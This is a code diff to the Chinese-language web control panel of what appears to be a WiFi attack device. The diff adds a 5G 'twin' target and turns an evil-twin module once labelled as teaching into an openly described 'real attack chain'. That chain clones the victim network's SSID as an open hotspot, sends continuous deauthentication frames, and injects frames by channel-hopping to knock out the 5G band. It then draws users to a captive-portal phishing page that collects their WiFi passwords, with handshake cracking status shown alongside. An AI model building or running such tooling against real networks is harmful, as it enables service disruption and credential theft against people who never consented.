@@ -108,7 +108,7 @@ html[data-theme=dark] td{border-bottom-color:#333}
 tr:hover td{background:#0000000a}
 .hidden-ssid{color:#8a7f6d;font-style:italic}
 .tbtn{border:2px solid #111;background:var(--yellow);padding:3px 8px;border-radius:6px;font-weight:800;cursor:pointer}
-.tbtn.pink{background:var(--pink)}
+.tbtn.pink{background:var(--pink)} .tbtn.purple{background:var(--purple)}
 .frow{display:flex;align-items:center;gap:12px;margin:10px 0;flex-wrap:wrap}
 .frow label{width:110px;font-weight:800;color:#8a7f6d}
 .frow .val{font-weight:900;font-family:"SF Mono",Menlo,monospace}
@@ -192,7 +192,7 @@ const esc = s => String(s ?? '').replace(/[<>&"]/g, c => ({ '<': '&lt;', '>': '&
 function fragPct(free, maxBlock) { return free > 0 ? Math.max(0, (100 - 100 * maxBlock / free)).toFixed(0) : '--'; }
 
 const state = {
-  info: null, target: null, scan: [], filter: 'all', logId: 0,
+  info: null, target: null, twin: null, scan: [], filter: 'all', logId: 0,
   deauthStatus: { running: false, count: 0, rate: 10, channel: 6, reason: 1 },
   handshakeStatus: { capturing: false, m1: false, m2: false, m3: false, m4: false, pmkid: false, captured: false, unsupported: false, keyver: 0, frames: 0, cracking: false, progress: 0, total: 7153, crackedPass: '' },
   creds: []
@@ -275,7 +275,7 @@ function renderDash() {
     <div class="card mod y">教学实验引擎<small id="mLab">空闲 · 待命</small></div>
   </div>
   <div class="grid g3a">
-    <div class="card"><h3>主要目标信息</h3><div id="tgtBox"></div></div>
+    <div class="card"><h3>目标信息 (主 / 双子)</h3><div id="tgtBox"></div></div>
     <div class="card"><h3>本机热点状态</h3><div id="apBox"></div></div>
     <div class="card"><h3>情报与捕获概览</h3><div id="capBox"></div></div>
   </div>
@@ -291,18 +291,19 @@ function renderDash() {
   renderTarget();
 }
 function renderTarget() {
-  const t = state.target, i = state.info;
+  const t = state.target, tw = state.twin, i = state.info;
   if ($('#tgtBox')) {
-    if (t) {
-      $('#tgtBox').innerHTML = `
-        <div class="kv"><span class="k">SSID</span><span class="v">${esc(t.ssid || '(隐藏)')}</span></div>
-        <div class="kv"><span class="k">MAC 地址</span><span class="v">${esc(t.bssid || '--')}</span></div>
-        <div class="kv"><span class="k">信道</span><span class="v mono">${t.channel ?? '--'}</span></div>
-        <div class="kv"><span class="k">安全</span><span class="v mono">${esc(t.auth || '--')}</span></div>
-        <div class="kv"><span class="k">信号</span><span class="v mono">${t.rssi ?? '--'} dBm</span></div>`;
-    } else {
-      $('#tgtBox').innerHTML = `<div class="kv"><span class="v" style="color:#8a7f6d">无目标 — 请前往「扫描与嗅探」设置</span></div>`;
-    }
+    const kv = x => x ? `
+      <div class="kv"><span class="k">SSID</span><span class="v">${esc(x.ssid || '(隐藏)')}</span></div>
+      <div class="kv"><span class="k">MAC 地址</span><span class="v">${esc(x.bssid || '--')}</span></div>
+      <div class="kv"><span class="k">信道</span><span class="v mono">${x.channel ?? '--'} ${x.channel > 14 ? '(5G)' : '(2.4G)'}</span></div>
+      <div class="kv"><span class="k">安全</span><span class="v mono">${esc(x.auth || '--')}</span></div>
+      <div class="kv"><span class="k">信号</span><span class="v mono">${x.rssi ?? '--'} dBm</span></div>`
+      : `<div class="kv"><span class="v" style="color:#8a7f6d">未设置 — 请前往「扫描与嗅探」设置</span></div>`;
+    const empty = '<div class="kv"><span class="v" style="color:#8a7f6d">无目标 — 请前往「扫描与嗅探」设置</span></div>';
+    $('#tgtBox').innerHTML = `
+      <div class="sub" style="margin:0 0 4px">🎯 主目标 <small style="color:#8a7f6d">(2.4G · 克隆热点与持续 Deauth 的对象)</small></div>${t ? kv(t) : empty}
+      <div class="sub" style="margin:12px 0 4px">👥 双子目标 <small style="color:#8a7f6d">(通常 5G · 跳频注入使其瘫痪)</small></div>${tw ? kv(tw) : `<div class="kv"><span class="v" style="color:#8a7f6d">未设置 — 攻击时将只压制 2.4G, 5G 频段不受影响</span></div>`}`;
   }
   if ($('#apBox') && i) {
     $('#apBox').innerHTML = `
@@ -322,8 +323,9 @@ function renderTarget() {
     $('#mLab').textContent = labStatus;
 
     $('#capBox').innerHTML = `
-      <div class="kv"><span class="k">双子状态</span><span class="v">${et.active ? '<b style="color:#35c04a">验证中 (' + esc(et.cloneSsid) + ')</b>' : '未启动'}</span></div>
-      <div class="kv"><span class="k">捕获密码凭据</span><span class="v">${et.credsCount ? '<b style="color:#ff7f6e">' + et.credsCount + ' 条</b>' : '0 条'}</span></div>
+      <div class="kv"><span class="k">双子状态</span><span class="v">${et.active ? '<b style="color:#35c04a">' + (et.apCloned ? '克隆热点已上线 (' + esc(et.cloneSsid) + ' · 开放无密码)' : '验证中 (' + esc(et.cloneSsid) + ')') + '</b>' : '未启动'}</span></div>
+      <div class="kv"><span class="k">双子跳频 (5G)</span><span class="v mono">${et.hopEnabled ? (et.hopping ? '跳频中…' : et.hopCount + ' 次 / ' + (et.twinFrames || 0) + ' 帧') : (et.active ? '未启用' : '--')}</span></div>
+      <div class="kv"><span class="k">捕获密码凭据</span><span class="v">${et.caught ? '<b style="color:#35c04a">已捕获 ✓ 攻击已收束</b>' : (et.credsCount ? '<b style="color:#ff7f6e">' + et.credsCount + ' 条</b>' : '0 条')}</span></div>
       <div class="kv"><span class="k">Deauth 发送</span><span class="v mono">${de.count || 0} 帧</span></div>
       <div class="kv"><span class="k">4次握手包</span><span class="v">${hs.m4 ? '<b style="color:#35c04a">已捕获完整</b>' : '未捕获'}</span></div>`;
     $('#sysState').textContent = i.ssid ? '系统就绪 · ' + i.ssid : '系统空闲';
@@ -359,9 +361,11 @@ function paintScan() {
     <tr>
       <td class="ssid ${n.hidden ? 'hidden-ssid' : ''}">${n.hidden ? '(隐藏网络)' : esc(n.ssid)}</td>
       <td class="rssi mono">${n.rssi} dBm</td>
-      <td class="mono">${n.channel}</td><td class="mono">${esc(n.bssid)}</td><td>${esc(n.auth)}</td>
-      <td><button class="tbtn pink" ${state.target && state.target.bssid === n.bssid ? 'disabled' : ''}
-        onclick='pickTarget(${JSON.stringify({ssid:n.ssid,bssid:n.bssid,channel:n.channel,rssi:n.rssi,auth:n.auth}).replace(/'/g,"&#39;")})'>设为主目标</button>
+      <td class="mono">${n.channel}${n.channel > 14 ? ' (5G)' : ' (2.4G)'}</td><td class="mono">${esc(n.bssid)}</td><td>${esc(n.auth)}</td>
+      <td style="white-space:nowrap"><button class="tbtn pink" ${state.target && state.target.bssid === n.bssid ? 'disabled' : ''}
+        onclick='pickTarget(${JSON.stringify({ssid:n.ssid,bssid:n.bssid,channel:n.channel,rssi:n.rssi,auth:n.auth}).replace(/'/g,"&#39;")}, "primary")'>设为主目标</button>
+        <button class="tbtn purple" style="margin-left:6px" ${state.twin && state.twin.bssid === n.bssid ? 'disabled' : ''}
+        onclick='pickTarget(${JSON.stringify({ssid:n.ssid,bssid:n.bssid,channel:n.channel,rssi:n.rssi,auth:n.auth}).replace(/'/g,"&#39;")}, "twin")'>设为双子</button>
       </td>
     </tr>`).join('') : `<tr><td colspan="6" class="nores" style="text-align:center;padding:20px;color:#888">${
       state.scan.length ? '无对应频段结果' : '尚未扫描 — 点「开始扫描」'}</td></tr>`;
@@ -377,6 +381,7 @@ function renderScan() {
     </div>
     <span class="st" id="scanStatus">就绪 · 点击开始扫描</span>
   </div>
+  <div class="card" style="padding:10px 14px;margin:0 0 12px;font-size:13px">操作顺序: <b>① 点击开始扫描 → ② 先把 5G 目标设为双子 → ③ 最后把 2.4G 设为主目标</b> → ④ 进入「邪恶双子攻击」点击「发起攻击」</div>
   <div class="table-wrap"><table>
     <thead><tr><th>SSID</th><th>RSSI</th><th>信道</th><th>BSSID</th><th>加密</th><th>操作</th></tr></thead>
     <tbody id="tbody"></tbody>
@@ -387,12 +392,27 @@ function renderScan() {
   $('#btnScan').onclick = realScan;
   paintScan();
 }
-async function pickTarget(t) {
-  await api('/api/target', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(t) });
-  state.target = t;
-  log('[target] 已选择主目标: ' + (t.ssid || '(隐藏)') + ' @ ' + t.bssid + ' 信道' + t.channel);
-  toast('已设置主目标: ' + (t.ssid || t.bssid));
-  go('eviltwin');
+async function pickTarget(t, role) {
+  role = role || 'primary';
+  if (role === 'primary' && t.channel > 14) {
+    toast('主目标必须是 2.4G 频段 — 5G 信号请「设为双子」');
+    log('[target] 拒绝: ' + (t.ssid || t.bssid) + ' 在 5G 信道 ' + t.channel + ', 不能作为主目标', 't-warn');
+    return;
+  }
+  try {
+    await api('/api/target', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(Object.assign({}, t, { role })) });
+  } catch (e) { toast('设置失败: ' + e.message); return; }
+  if (role === 'twin') {
+    state.twin = t;
+    log('[target] 已设置双子目标: ' + (t.ssid || '(隐藏)') + ' @ ' + t.bssid + ' 信道' + t.channel + ' (5G)');
+    toast('已设置双子: ' + (t.ssid || t.bssid));
+    paintScan();
+  } else {
+    state.target = t;
+    log('[target] 已设置主目标: ' + (t.ssid || '(隐藏)') + ' @ ' + t.bssid + ' 信道' + t.channel);
+    toast('已设置主目标: ' + (t.ssid || t.bssid));
+    go('eviltwin');
+  }
 }
 
 /* ---------- 3. 邪恶双子 (Evil Twin & 凭据捕获) ---------- */
@@ -413,24 +433,37 @@ function paintCreds() {
       <td>${esc(c.time)}</td>
     </tr>`).join('') : `<tr><td colspan="4" style="text-align:center;padding:16px;color:#888">暂无捕获凭据 (等待目标连接假热点并在认证页输入密码)</td></tr>`;
 }
+/* 双子攻击实时状态条: 攻击进行中由 pollModules 定点刷新 (不重建整页, 避免输入框被重置) */
+function etLiveHtml(et = {}, de = {}, clients = 0) {
+  return `<span class="status-pill ${et.apCloned ? 'run' : 'idle'}">${et.apCloned ? '● 克隆热点已上线 (开放无密码)' : '○ 克隆热点未生效'}</span>
+      <span class="status-pill ${de.running ? 'run' : 'idle'}">主目标 Deauth: ${de.count || 0} 帧${de.running ? ' (持续)' : ' (已停止)'}</span>
+      <span class="status-pill ${et.hopEnabled ? 'run' : 'idle'}">双子跳频: ${et.hopEnabled ? ((et.hopping ? '跳频中… ' : '') + (et.hopCount || 0) + ' 次 / ' + (et.twinFrames || 0) + ' 帧') : '未启用'}</span>
+      <span class="status-pill ${clients ? 'run' : 'idle'}">已接入设备: ${clients ?? 0} 台</span>`;
+}
 function renderEvilTwin() {
-  const t = state.target || {};
-  const active = state.info?.evilTwin?.active || false;
+  const t = state.target || {}, tw = state.twin || {};
+  const et = state.info?.evilTwin || {};
+  const de = state.info?.deauth || {};
+  const active = et.active || false;
+  const band = ch => ch > 14 ? '5G' : '2.4G';
+  const pillText = active ? (et.caught ? '● 已捕获凭据 · 点停止恢复热点' : '● 攻击进行中') : '○ 待命';
   $('#view').innerHTML = `
   <div class="card">
     <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
-      <h3 style="margin:0">👤 邪恶双子 (Evil Twin & 凭据钓鱼验证)</h3>
-      <span class="status-pill ${active ? 'run' : 'idle'}">${active ? '● 正在运行' : '○ 待命'}</span>
+      <h3 style="margin:0">👤 邪恶双子攻击 (Evil Twin & 凭据钓鱼)</h3>
+      <span class="status-pill ${active ? 'run' : 'idle'}">${pillText}</span>
     </div>
-    <p class="note" style="margin-bottom:14px">克隆主目标同名热点，配合 Captive Portal 强制门户将连接客户端重定向至路由器安全更新认证页，演示凭据钓鱼防范。</p>
-    <div class="frow"><label>目标网络</label><div class="val">${t.ssid ? esc(t.ssid) + ' (' + esc(t.bssid) + ')' : '<span style="color:#888">未设置 (可直接输入克隆名)</span>'}</div></div>
-    <div class="frow"><label>克隆 SSID</label><input type="text" id="etSsid" value="${esc(t.ssid || 'WiFi-Secure')}" placeholder="输入伪造的热点名称"></div>
-    <div class="frow"><label>诱导页面模板</label><select id="etTpl"><option value="1">路由器固件更新安全验证 (高仿弹窗)</option><option value="2">公共场所网络免密认证</option></select></div>
+    <p class="note" style="margin-bottom:14px">真实攻击链: ① 热点改名为与主目标<b>一模一样</b>的 SSID (开放无密码, 信道对齐主目标) ② 对主目标持续注入 Deauth ③ 每 2s 跳频到双子信道连发 3 帧, 使目标 <b>5G 频段瘫痪</b> — 目标设备发现无法上网, 只能接入同名克隆热点, Captive Portal 自动弹出钓鱼页等待输入密码。</p>
+    <div class="frow"><label>主目标 (2.4G)</label><div class="val">${t.ssid ? esc(t.ssid) + ' <span class="mono">(' + esc(t.bssid) + ' @ch' + t.channel + ' ' + band(t.channel) + ')</span>' : '<span style="color:#d9534f">未设置 — 攻击无法发起, 请先在「扫描与嗅探」把 2.4G 信号设为主目标</span>'}</div></div>
+    <div class="frow"><label>双子目标 (5G)</label><div class="val">${tw.ssid ? esc(tw.ssid) + ' <span class="mono">(' + esc(tw.bssid) + ' @ch' + tw.channel + ' ' + band(tw.channel) + ')</span>' : '<span style="color:#ffa14d">未设置 — 攻击将只瘫痪 2.4G, 目标 5G 设备仍可正常上网</span>'}</div></div>
+    <div class="frow"><label>克隆 SSID</label><input type="text" id="etSsid" value="${esc(state.target ? (t.ssid || '') : 'WiFi-Secure')}" placeholder="留空 = 与主目标完全同名"></div>
     <div class="sub" style="margin-top:16px">
-      <button class="btn green" id="btnStartET" ${active ? 'disabled' : ''}>⚡ 启动双子验证</button>
-      <button class="btn red" id="btnStopET" ${!active ? 'disabled' : ''}>⏹ 停止实验</button>
+      <button class="btn green" id="btnStartET" ${active ? 'disabled' : ''}>⚡ 发起攻击</button>
+      <button class="btn red" id="btnStopET" ${!active ? 'disabled' : ''}>⏹ 停止并恢复热点</button>
       <a class="btn yellow" href="/portal.html" target="_blank" rel="noopener">👁 预览钓鱼门户</a>
     </div>
+    ${active ? `
+    <div class="sub" style="margin-top:16px;font-size:13px" id="etLive">${etLiveHtml(et, de, state.info?.clients)}</div>` : ''}
   </div>
 
   <div class="card">
@@ -452,15 +485,23 @@ function renderEvilTwin() {
   <div class="logc" id="logc">[SYSTEM] 就绪。</div>`;
 
   $('#btnStartET').onclick = async () => {
-    const cloneSsid = $('#etSsid').value.trim() || 'Free-WiFi';
-    await api('/api/eviltwin/start', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cloneSsid }) });
-    toast('邪恶双子验证已启动');
+    const cloneSsid = $('#etSsid').value.trim();
+    try {
+      await api('/api/eviltwin/start', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cloneSsid }) });
+    } catch (e) {
+      let msg = e.message; try { msg = JSON.parse(e.message).error || msg; } catch (_) {}
+      toast('发起失败: ' + msg);
+      log('[eviltwin] 发起失败: ' + msg, 't-warn');
+      return;
+    }
+    toast('攻击已发起: 同名克隆热点 + 双频段压制');
+    log('[eviltwin] 攻击已发起, 等待目标设备接入钓鱼热点…', 't-ok');
     pollInfo();
     renderEvilTwin();
   };
   $('#btnStopET').onclick = async () => {
     await api('/api/eviltwin/stop', { method: 'POST' });
-    toast('邪恶双子验证已停止');
+    toast('攻击已停止, 原热点已恢复');
     pollInfo();
     renderEvilTwin();
   };
@@ -756,6 +797,7 @@ async function pollInfo() {
     const i = await api('/api/info');
     state.info = i;
     if (!state.target && i.target) state.target = i.target;
+    if (!state.twin && i.twin) state.twin = i.twin;
     $('#up').textContent = fmtUp(i.uptime);
     $('#memBar').style.width = (i.memUsedPct ?? 0) + '%';
     $('#memTxt').textContent = (i.memUsedPct ?? 0) + '%';
@@ -782,6 +824,10 @@ async function pollModules() {
       if ($('#deCount')) $('#deCount').textContent = d.count;
       if ($('#deStatusVal')) $('#deStatusVal').textContent = d.running ? 'ACTIVE' : 'IDLE';
       if ($('#deTxMode')) $('#deTxMode').textContent = deTxModeText(d);
+    }
+    // 轮询 双子攻击 状态: 仅更新状态条, 不重建整页
+    if (location.hash === '#eviltwin' && $('#etLive') && state.info) {
+      $('#etLive').innerHTML = etLiveHtml(state.info.evilTwin, state.info.deauth, state.info.clients);
     }
     // 轮询 握手包 状态: 仅定向更新 DOM, 避免重构整页导致按钮与操作闪烁
     if (location.hash === '#handshake') {
